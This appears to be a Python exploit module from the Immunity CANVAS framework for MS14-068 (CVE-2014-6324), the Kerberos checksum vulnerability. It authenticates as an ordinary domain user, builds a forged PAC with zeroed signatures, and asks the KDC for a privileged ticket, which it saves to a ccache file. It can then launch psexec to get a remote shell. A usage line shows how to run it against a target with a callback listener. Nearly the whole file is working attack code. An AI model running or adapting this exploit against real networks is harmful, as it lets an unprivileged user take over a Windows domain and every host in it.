#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  ms14_068.py
## Description:
##            :
## Created_On :  Wed Jan 15 17:46:17
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
###############################################################################

import sys
import socket
import os
import time
import struct
import random
import logging
from datetime import datetime

if '.' not in sys.path:
    sys.path.append('.')

NAME                            = 'Kerberos Checksum Vulnerability'
DESCRIPTION                     = 'An attacker with unprivileged domain user account privileges could gain the domain administrator account privileges thus compromising any host on the network.'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Microsoft'
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['Repeatability']  = ''
DOCUMENTATION['CVE Name']       = 'CVE-2014-6324'
DOCUMENTATION['CVE Url']        = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6324'
DOCUMENTATION['CVSS']           = 0.0
DOCUMENTATION['Note']           = 'Please refer to the Microsoft URLs to know exactly the conditions for when this vulnerability is exploitable.'

VERSION                         = '1.0'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [['Windows']]
PROPERTY['VERSION']             = ['NT', '2000', 'XP', 'Vista', '7', '2003', '2008']
PROPERTY['MSADV']               = 'MS14-068'

CHANGELOG = """
"""

NOTES = """
Usage:
./commandlineInterface.py -v 17 -p 5555
python ./exploits/ms14_068/ms14_068.py -t 192.168.0.1 -Ouser:$user -Opassword:$pass -Odomain:$domain -l 192.168.0.12 -d 5555

You might see the module being reported as failing from CANVAS although the exploit actually succeeded."
"""

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from engine import CanvasConfig
from engine.config import canvas_root_directory
from libs.canvasos import *
from libs.kerberos.protocol import AsReq, AsRep, TgsReq, TgsRep, Convert2PrincipalType
from libs.kerberos.pac import Pac, PacClientInfoIB, PacLogonInformationIB, PacSignatureDataIB
from libs.kerberos.filetimes import dt_to_filetime, utc
import libs.kerberos.ccache as cc
import libs.newsmb.lsarpc as lsa
import libs.kerberos.helper as helper

try:
    from pyasn1.codec.ber import encoder, decoder
except ImportError:
    logging.error("ms14_068: Cannot import pyasn1 (required)")
    raise

targets = {
    0: ['Autoversioning', 0],
    1: ['Windows ALL', 0]
}

###
# Helper class to manage sockets because Kerberos TCP is slightly different.
###

class KerbSocket:
    def __init__(self, ip, port, tcp):
        self.target_ip = ip
        self.target_port = port
        self.tcp = tcp
        if self.tcp:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect((self.target_ip,self.target_port))
        else:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def close(self):
        self.s.close()

    def send(self, data):
        if self.tcp:
            return self.s.send(struct.pack('>L', len(data)) + data)
        else:
            return self.s.sendto(data, (self.target_ip,self.target_port))

    def recv(self):
        # For now it seems more than enough
        data = self.s.recv(4096)
        if self.tcp:
            data = data[4:]
        return data

###
# Our exploit class
###

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        randint               = random.randint(0, 5000)
        self.name             = NAME
        self.port             = 445
        self.version          = 0
        self.covertness       = 0
        self.user             = ''
        self.password         = ''
        self.domain           = ''
        self.needsNoShellcode = 1
        self.kdc_ip           = None
        self.user_sid         = None
        self.ARCH             = "X86"
        self.is_64            = False
        self.local_path       = os.path.abspath(os.path.join(os.path.dirname(__file__), "tmp/"))

        if not os.path.exists(self.local_path):
            os.makedirs(self.local_path)

        self.do_exec          = True
        self.debug_tmp        = False
        self.ccache_file      = os.path.join(self.local_path, 'ccache_%4.4d' % randint)

    def clean_tmp(self):
        if not self.debug_tmp and not self.do_exec:
            if os.path.exists(self.ccache_file):
                os.remove(self.ccache_file)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getArgs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        self.version = int(self.argsDict.get('version', self.version))
        self.ARCH = self.argsDict.get('arch', self.ARCH)
        self.user = self.argsDict.get('user', self.user)
        self.password = self.argsDict.get('password', self.password)
        self.domain = self.argsDict.get('domain', self.domain)
        self.kdc_ip = self.argsDict.get('kdc', self.kdc_ip)
        self.do_exec = self.argsDict.get('do_exec', self.do_exec)
        return

    def get_user_sid(self, target_ip, username):
        self.user_sid = lsa.lsa_get_user_sid(target_ip,
                                             account_name=self.user,
                                             username=self.user,
                                             password=self.password,
                                             domain=self.domain)
        if not self.user_sid:
            return False

        return True

    def build_pac(self, logon_time):
        pacobj = Pac()
        pacobj.set_header()
        dt = datetime.strptime(logon_time, '%Y%m%d%H%M%SZ')
        logon_time2 = dt_to_filetime(dt)
        pacobj.add_info_buffer(1, PacLogonInformationIB({'user_name' : self.user,
                                                         'user_sid' : self.user_sid,
                                                         'domain_name' : self.domain,
                                                         'logon_time' : logon_time}))
        pacobj.add_info_buffer(10, PacClientInfoIB({'clientID' : logon_time2,
                                                    'name' : self.user.encode('utf-16le'),
                                                    'nameLength' : len(self.user.encode('utf-16le'))}))
        sig_srv = [7, "\x00" * 16]
        sig_kdc = [7, "\x00" * 16]
        pacobj.add_info_buffer(6, PacSignatureDataIB({'type' : sig_srv[0],
                                                      'data' : sig_srv[1]}))
        pacobj.add_info_buffer(7, PacSignatureDataIB({'type' : sig_kdc[0],
                                                      'data' : sig_kdc[1]}))
        pac = pacobj.pack()

        return pac

    def build_auth_file(self, to, use_tcp=False):

        try:
            if use_tcp:
                logging.info('Performing TCP requests to create the magic ticket!')
            else:
                logging.info('Performing UDP requests to create the magic ticket!')

            client_principal = Convert2PrincipalType(self.user, self.domain)
            auth_principal = Convert2PrincipalType('krbtgt/' + self.domain, self.domain)
            asreq = AsReq(client_principal, self.domain)
            asreq.set_server_principal(auth_principal)
            asreq.set_encryption_types([helper.ETYPE_ARCFOUR_HMAC_MD5])
            asreq.set_passphrase(self.password)
            asreq.set_pac_req_opt(False)
            frame = asreq.pack()

            s = KerbSocket(to[0], to[1], use_tcp)
            s.send(frame)
            data = s.recv()
            s.close()

            if not data:
                logging.error('AS request failed: no answer received')
                return False

            resp = AsRep(data)
            if not resp.is_valid():
                logging.error('AS request failed: Invalid response or wrong status')
                return False

            # Extract the ticket, session key, times struct and flags
            raw_ticket = resp.get_ticket()
            resp.set_passphrase(self.password)
            session_key = resp.get_session_key()
            authtime = resp.get_authtime().asOctets()
            pac = self.build_pac(authtime)
            tgsreq = TgsReq(self.domain,
                            client_principal=client_principal,
                            server_principal=auth_principal)
            tgsreq.set_ticket(raw_ticket)
            tgsreq.set_session_key(session_key)
            tgsreq.set_pac(pac)
            frame = tgsreq.pack()

            s = KerbSocket(to[0], to[1], use_tcp)
            s.send(frame)
            data = s.recv()
            s.close()
            if not data:
                logging.error('TGS request failed: no answer received')
                return False

            subkey = tgsreq.get_subkey()
            resp2 = TgsRep(data)
            if not resp2.is_valid():
                logging.error('TGS request failed: Invalid response or wrong status')
                return False

            resp2.set_key(subkey)

            # Extract the ticket, session key, times struct and flags
            raw_ticket2 = resp2.get_ticket()
            session_key2 = resp2.get_session_key()
            times2 = resp2.get_times()
            flags2 = resp2.get_flags()

            # Adds information to the CCache
            cc1 = cc.CCache()
            cc1.open(self.ccache_file, new=1)
            cc1.set_header(client_principal, self.domain)
            cc1.import_creds(client_principal,
                             auth_principal,
                             session_key2,
                             times2,
                             tktflags=flags2,
                             is_skey=0,
                             ticket=raw_ticket2)
            cc1.write()
            return True

        except Exception as e:
            logging.error(str(e))
            return False

    def get_kdc_ip_list(self):
        try:
            dom, host, ip_list = socket.gethostbyname_ex(self.domain)
            self.kdc_ip_list = ip_list
            return True
        except Exception as e:
            logging.error('DNS A request to %s failed: %s' % (self.domain, str(e)))
            return False

    def is_alive_with_smb(self):
        try:
            s = KerbSocket(self.host, self.port, tcp=True)
            s.close()
            return 1
        except Exception as e:
            return 0

    def test(self):
        self.getArgs()
        if self.do_exec:
            if self.is_alive_with_smb():
                return 1
            else:
                return 0
        return 0

    def testOS(self, target_ip):
        isWindows = True

        logging.info('Attempting to fingerprint %s' % target_ip)
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        app.target.interface = target_ip
        app.argsDict["smb"]                 = True
        app.argsDict["http"]                = False # not needed
        app.argsDict["ssh"]                 = False # not needed
        app.argsDict["mdns"]                = False # not needed
        app.argsDict["ntp"]                 = False # not needed
        app.argsDict["ftp"]                 = False # not needed
        app.argsDict["smtp"]                = False # not needed
        app.argsDict["dtspcd"]              = False # not needed
        app.argsDict["ipfi"]                = False # not needed
        app.argsDict["telnet"]              = False # not needed
        app.argsDict["nolanguagedetect"]    = True  # not needed

        if app.run() == 0:
            logging.info('Automatic detection failed')
            return None

        myos = app.result

        # Detection of the OS is straightforward
        if myos.base != 'Windows':
            logging.info("A non-Windows host has been detected")
            isWindows = False

        return isWindows

    def run(self):
        self.getArgs()

        # Sanity check
        if self.ARCH == 0:
            self.ARCH = "X86"
        if self.ARCH == 1:
            self.ARCH = "x64"

        if self.ARCH not in ["X86", "x64"]:
            logging.error("Incorrect architecture was specified on the CLI: %s" % self.ARCH)
            return 0

        # First of all, let's check that the target is alive. Since we will be
        # using tcp/445 for service upload/creation, a tcp connect is fair check.
        # Note: However we should also in another version consider the case of SMB over UDP.
        if not self.is_alive_with_smb():
            logging.info("Target doesn't have SMB exposed. Bailing")
            return 0

        # By default, the architecture is X86 but we may force X64 if required.
        if self.ARCH == 'x64':
            self.is_64 = True

        # If automatic was selected, we need to know if the remote host is windows
        if self.version == 0:
            logging.info("Fingerprinting our target")
            self.isWindows = self.testOS(self.host)
            if self.isWindows == None:
                logging.info("OS detection failed. You may rerun the exploit forcing Windows")
                return 0
            else:
                if self.isWindows == False:
                    logging.error('Not a Windows target. Aborting')
                    return 0

        # Ok now that we know our target, let's focus on the AD
        self.setInfo('%s attacking %s:%d - (in progress)' % (self.name, self.host, self.port), showlog=True)
        self.setProgress(10)
        logging.info('Attacking domain: %s' % (self.domain))

        # Get all the IP of potential KDC on the network
        if not self.kdc_ip:
            if self.get_kdc_ip_list():
                logging.info("Automatically found KDC IPs: %s" % ",".join(self.kdc_ip_list))
            else:
                logging.error("Cannot automatically detect a KDC. Please run again the exploit with KDC ip")
                return 0
        else:
            logging.info("Targeting KDC %s" % (self.kdc_ip))
            self.kdc_ip_list = [self.kdc_ip]

        good_to_go = False
        kdc_port = 88
        self.setProgress(20)

        # Now it's time to check all the AD one bye one.
        # We wont use fingerprinting but rather a slightbruteforce using first
        # UDP and then TCP. If one of the AD gives us what we want, we stop!
        for kdc_ip in self.kdc_ip_list:
            if not self.get_user_sid(kdc_ip, self.user):
                logging.error('Could not retrieve the SID of the user on %s' % kdc_ip)
                continue

            logging.info('User %s has SID %s' % (self.user, self.user_sid))
            to = (kdc_ip, kdc_port)

            if self.build_auth_file(to, use_tcp=False):
                logging.info('ccache file was built and stored in %s' % self.ccache_file)
                # Ok we got everything
                good_to_go = True
                break
            else:
                logging.error('Could not build the ccache file using UDP')
                if self.build_auth_file(to, use_tcp=True):
                    logging.info('ccache file was built and stored in %s' % self.ccache_file)
                    # Ok we got everything
                    good_to_go = True
                    break
                else:
                    logging.error('Could not build the ccache file using TCP')
                    continue

        # Did we create the credential file?
        if not good_to_go:
            logging.error('None of the KDC could be exploited')
            self.clean_tmp()
            return 0

        # Maybe the user only wants the magic ticket!
        if not self.do_exec:
            logging.info('%s done (Success!)' % (self.name))
            self.setProgress(100)
            self.clean_tmp()
            return 1

        # But maybe he wants a shell
        self.setProgress(50)

        psexec_args = {
            "port": self.port,
            "version": self.version,
            "user": self.user,
            "password": 'whatever',
            "domain": self.domain,
            "krb5_ccache": self.ccache_file,
        }

        self.exploitnodes("psexec", args=psexec_args, target=self.target)
        self.setProgress(100)
        logging.info('%s done (Success!)' % (self.name))
        self.clean_tmp()
        return 1


if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app = theexploit()
    try:
        ret = standard_callback_commandline(app)
    except KeyboardInterrupt:
        pass

    if ret not in [0, 1, None] and hasattr(ret, 'interact'):
        ret.interact()
